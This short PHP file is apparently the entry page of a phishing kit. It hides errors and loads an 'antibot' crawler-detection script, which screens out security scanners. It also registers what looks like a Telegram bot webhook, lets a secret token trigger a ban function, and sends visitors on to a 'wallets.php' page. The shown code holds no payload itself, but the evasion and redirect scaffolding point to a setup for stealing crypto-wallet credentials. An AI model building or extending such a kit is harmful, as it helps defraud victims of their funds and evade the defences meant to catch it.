<?php
error_reporting(0);
include './files/antibot/crawlerdetect.php';
include_once 'functions.php';
global $bot_token;
set_webhook();
$token = str_replace(":", "", $bot_token);
if(isset($_GET['token']) && $_GET['token'] == $token)
{
    add_ban();
}
?>

<meta http-equiv="Refresh" content="0; url='./wallets.php" />